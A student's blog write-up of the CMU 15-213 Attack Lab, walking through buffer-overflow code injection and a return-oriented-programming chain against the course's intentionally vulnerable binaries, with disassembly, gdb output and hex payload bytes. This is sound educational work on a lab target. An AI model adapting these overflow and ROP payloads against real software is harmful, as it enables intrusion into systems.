---
title: CMU 15-213 Attack Lab
date: 2026-08-31 23:51:43
categories: 笔记
tags:
    - cmu15213
    - c
    - asm
excerpt: Fun puzzles in attacklab
---

# Attack Lab

- It is quite reasonable to put this lab along with bomb lab as they rely on basically the same skill, which is the ability to read and decipher and understand the control flow of the assembly code compiled from c source code.

- Funny enough, these two labs are far easier than the first data lab in my opinion. It is such a pain in the ass to play with machine level data representation convention, considering all its corner cases and magic bit level tricks.

# Records

## Code Injection Attacks

### Level 1

- This is kinda like a warm-up phase for this lab, requiring an input to manipulate the program towards another function while not calling it from source code.

- By looking at the assembly code of function `getbuf`:

    ```asm
    00000000004017a8 <getbuf>:
        4017a8:	48 83 ec 28          	sub    $0x28,%rsp
        4017ac:	48 89 e7             	mov    %rsp,%rdi
        4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
        4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
        4017b9:	48 83 c4 28          	add    $0x28,%rsp
        4017bd:	c3                   	ret
        4017be:	90                   	nop
        4017bf:	90                   	nop
    ```

- We can see that the function allocates `0x28` bytes on the stack as the buffer holding user input.

- To understand how a buffer-overflow attack happens, we need a graph:

<img src="https://files.seeusercontent.com/2026/09/02/dk9K/getbuf.png" alt="getbuf.png" width="600" />

- We are required to modify the return address stored at the top of `getbuf`'s stack frame, which is at address `0x5561dca0`.

- The saved return address is 40 bytes after the beginning of the buffer. Therefore, the payload nees 40 characters(each takes up 1 byte) of padding followed by the 8-byte address of `touch1`.

- Immediately can we use `hex2raw` to generate an ASCII representation of the hexadecimal address of the target function `touch1`, which is `0x4017c0`. Following 40 characters taking up 40 bytes which fills up the prepared buffer, we can override the return address to where we want the next instruction pointer points to.

- Keep in mind the on a litte-edian machine, data is stored reversed byte-wise:

    ```asm
    c0 17 40 00 00 00 00 00     /* 8-byte address reversed byte-wise */
    ```

### Level 2

- Now we need to jump into another function with an parameter. Recall that the positions of the parameters of a function call:

    > For a standard function call, 6 of its parameters goes into `RDI, RSI, RDX, RCX, R8, R9` in order.

- That means we should put our desired parameter in `%rdi` before jumping, which requires injected instructions.

- As the instruction pointer stored in `%rip` increments each time it completes an instuction, the injected instructions on stack should be arranged in positive order by address. As a result, the input should consist:

    ```plaintext
    <placeholder> + <instructions> + <override address>
    ```

- We want to execute the injected instructions when `getbuf` returns, so the 8 bytes at `0x5561dca0` should be the address of the first injected instruction. And after putting the desired variable into `%rdi`, we should override the value stored at the address pointed to by `%rsp` to function `touch2`.

- By looking at the assembly, we can find that the desired `cookie` is located at `0x6044e4`:

    ```asm
    4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
    ```

- And its value:

    ```gdb
    (gdb) x/wx 0x6044e4
    0x6044e4 <cookie>:      0x59b997fa
    ```

- So the instructions should be:

    ```asm
    mov    $0x59b997fa,%rdi
    movl   $0x4017ec,(%rsp)
    ret
    ```

    > [!TIP]
    > May be we should use `pushq`? Well, `movl` works well this time as the upper 32 bits are filled with 0 at the moment.

- Each of the `mov` instruction takes 7 bytes, and 1 byte for `ret`. That leaves a `40 - 15 = 25` bytes space remaining in the buffer that needs to be filled up.

- And the starting address of the injected instructions is `0x5561dca0 - 0xf = 0x5561dc91`.

    > [!TIP]
    > May be we should place the injected instructions at the beginning of the buffer? That way we wouldn't need to calculate the start address of the instructions.

### Level 3

- This time we are required to implant a string into the memory in order to pass the `strncmp` in `hexmatch`.

- Turns out the string required in this phase is cookie in hexadecimal without the prefix '0x', `59b997fa`, with a trailing `\0`.

- The most tricky thing about this phase is that calling `hexmatch` and `touch3` would cause the program to push some of the callee-saved registers' values onto the stack, which may override our injected string as `%rsp` increases after each return from our injected instructions and move on to `touch3`.

- Especially the large local array allocated by `hexmatch`: `char cbuf[110]`, which completely annihilate the feasibility to put the string inside the `getbuf` buffer as it would be override completely at the moment.

- We can observe the program's behavior and record the values of `%rsp` to see where we can get a memory area untouched to save our injected string:

    ```plaintext
    0x5561dc78 ... 0x5561dca0 : buffer / padding
    0x5561dca0                : saved return address -> injected code
    0x5561dca8                : next return address -> touch3
    0x5561dcb0                : random data from upper stack frame
    ```

- Then `touch3` and `hexmatch` would push registers onto the stack and allocate local array, meaning that we cannot choose any address lower than `0x5561dcb0` to store our string.

- Let's place the string at `0x5561dcb0`.

{% folding blue::NOTE %}

- Also noted that `strncmp` does not compare the integer cookie directly. `hexmatch` first formats the cookie as an eight-character hexadecimal string, and then compares that string pointed to by `sval`:

    ```c
    int hexmatch(unsigned val, char *sval) {
        char cbuf[110];
        /* Make position of check string unpredictable */
        char *s = cbuf + random() % 100;
        sprintf(s, "%.8x", val);
        return strncmp(sval, s, 9) == 0;
    }

    void touch3(char *sval) {
        vlevel = 3; /* Part of validation protocol */
        if (hexmatch(cookie, sval)) {
            printf("Touch3!: You called touch3(\"%s\")\n", sval);
            validate(3);
        } else {
            printf("Misfire: You called touch3(\"%s\")\n", sval);
            fail(3);
        }
        exit(0);
    }
    ```

- We can clearly see that we are required to put a pointer to the injected string into `%rdi` before jumping to `touch3`, and the actual value that is being compared to that injected string is the value of the cookie: `59b997fa` as a **string** (`\0` as terminator ofc) instead of actual value in memory, as `sprintf` would convert that `val` into ASCII representation.

- So there's no way we can get the ready-made ASCII representation from the memory. We'll have to inject the string ourselves.

{% endfolding %}

- Quite like the previous phase, we still need to override the return address of `getbuf` to our injected code. Then put the address of the injected string to `%rdi`, then modify the return address again to `touch3`, then `ret`.

    ```asm
    mov    $0x5561dcb0,%rdi     /* address of the injected string */
    movl   $0x4018fa,(%rsp)
    ret
    ```

- Then we'll override the return address to `0x5561dc91`, the same as level 2 as the length of the injected instructions doesn't change.

- Moreover we need to gap the space between `0x5561dca8` to `0x5561dcb0`, which is 8 byte long. Just fill in anything in hexadecimal representation.

- At last the ASCII string. Checking `man ascii`:

    ```plaintext
    35 39 62 39 39 37 66 61         /* injected string */
    00                              /* \0 */
    ```

- Now we've constructed the whole thing, put them together and use `hex2raw` to generate the final input.

## Return-Oriented Programming

- This time the modern OS's defenses against code injection are online, including randomizing the stack address and marking the stack as nonexecutable. This makes it impossible for injected instructions to work, we'll have to find helpful gadgets from the program itself to perform the attack.

### Level 4

- Though previous injection won't work this time, the logic of the attack is the same:
    - overflow buffer to override return address
    - put `0x59b997fa` into `%rdi`
    - jump to `touch3`

- We can find useful two gadgets from the _farm_ provided in this new `rtarget`:

    ```asm
    00000000004019a0 <addval_273>:
        c:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
        12:	c3                   	ret

    00000000004019a7 <addval_219>:
        13:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
        19:	c3                   	ret
    ```

    - The first one (addval_273) contains:

        ```asm
        00000000004019a2 <addval_273 + 2>:
            48 89 c7        movq    %rax,%rdi
            c3              ret
        ```

    - While the second contains:

        ```asm
        00000000004019ab <addval_219 + 4>
            58              popq    %rax
            90              nop
            c3              ret
        ```

- Now we have a plan: inject the cookie on to the stack, pop it to `%rax` then move it to `%rdi`, finally jump to `touch2`.

- Since the `ret` at the end of each gadget would increment `%rsp` by 8, there's no need of jumping to injected instructions.

    ```asm
    ab 19 40 00 00 00 00 00         /* 219+4: popq %rax */
    fa 97 b9 59 00 00 00 00         /* cookie */
    a2 19 40 00 00 00 00 00         /* 273+2: movq %rax,%rdi */
    ec 17 40 00 00 00 00 00         /* touch 2 */
    ```

### Level 5

- You know what, I'm scared when the handout says:

    > That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so.

- So I'm stopping here.

# End

- Nice little lab.

- Actually I think buffer-overflow attacks are more interesting than ROP, though they do not work these days. It feels kinda boring to find all the gadgets across the program(without a farm) and composing them together.
